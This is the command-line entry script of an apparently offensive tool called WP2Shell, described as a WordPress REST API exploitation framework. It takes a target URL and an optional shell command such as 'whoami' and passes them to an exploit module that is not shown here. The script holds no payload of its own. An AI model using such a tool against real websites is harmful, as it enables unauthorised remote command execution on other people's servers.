#!/usr/bin/env python3
"""WP2Shell - WordPress REST API Exploitation Framework"""

import sys
from lib.output import Output
from exploit.core import Exploit

def main():
    if len(sys.argv) not in (2, 4) or (len(sys.argv) == 4 and sys.argv[2] != "-c"):
        print("Usage: python3 main.py <target> [-c command]")
        print("Example: python3 main.py https://target.com")
        print("Example: python3 main.py https://target.com -c 'whoami'")
        sys.exit(1)

    target = sys.argv[1]
    initial_command = sys.argv[3] if len(sys.argv) == 4 else None

    try:
        exploit = Exploit(target)
        if exploit.run(initial_command):
            sys.exit(0)
        else:
            sys.exit(1)

    except KeyboardInterrupt:
        print()
        Output.error("Aborted")
        sys.exit(1)
    except Exception as e:
        Output.error(f"Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
